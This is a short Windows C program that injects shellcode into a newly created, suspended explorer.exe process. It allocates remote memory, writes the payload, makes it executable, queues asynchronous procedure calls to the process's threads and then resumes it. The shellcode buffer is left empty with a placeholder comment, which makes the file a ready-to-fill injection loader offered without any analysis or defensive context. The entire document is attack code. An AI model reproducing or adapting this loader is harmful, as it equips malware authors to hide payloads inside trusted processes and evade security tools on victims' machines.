#include <windows.h>
#include <tlhelp32.h>

// Configuration
char *targetPath = "explorer.exe";
unsigned char payloadBuffer[] = { /* shellcode bytes go here. the shellcode must exit the process, otherwise the process will continue its normal startup */ };

BOOL QueueAPCsToProcess(DWORD pid, PAPCFUNC apcRoutine, ULONG_PTR param)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    THREADENTRY32 te;
    te.dwSize = sizeof(te);
    Thread32First(snap, &te);

    do {
        if (te.th32OwnerProcessID == pid) {
            HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
            QueueUserAPC(apcRoutine, hThread, param);
            CloseHandle(hThread);
        }
    } while (Thread32Next(snap, &te));

    CloseHandle(snap);
    return TRUE;
}

int main()
{
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    // 1. Create target process suspended
    CreateProcessA(NULL, targetPath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);

    // 2. Allocate memory in target process
    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, sizeof(payloadBuffer), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // 3. Write payload bytes
    WriteProcessMemory(pi.hProcess, remoteMem, payloadBuffer, sizeof(payloadBuffer), NULL);

    // 4. Make memory executable
    DWORD oldProtect;
    VirtualProtectEx(pi.hProcess, remoteMem, sizeof(payloadBuffer), PAGE_EXECUTE_READ, &oldProtect);

    // 5. Queue APCs to existing threads
    QueueAPCsToProcess(pi.dwProcessId, (PAPCFUNC)remoteMem, 0);

    // 6. Resume execution
    ResumeThread(pi.hThread);

    // 7. Cleanup
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}